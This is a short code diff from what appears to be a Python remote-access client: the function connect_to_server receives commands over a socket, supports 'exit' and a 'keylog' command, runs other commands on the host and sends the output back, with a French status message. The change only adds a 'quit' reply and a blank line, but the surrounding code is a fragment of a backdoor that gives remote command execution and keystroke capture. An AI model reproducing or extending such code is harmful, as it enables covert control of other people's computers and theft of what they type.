@@ -48,6 +48,7 @@ def connect_to_server():
         try:
             command = cs.recv(1024).decode()
             if command.lower() == 'exit':
+                cs.send(b'quit')
                 break
             elif command.lower() == 'keylog':
                 try:
@@ -73,6 +74,7 @@ def connect_to_server():
                 output = result.stdout + result.stderr
                 if not output:
                     output = "Commande executée, pas de sortie !."
+
                 cs.send(output.encode())
 
         except ConnectionResetError:
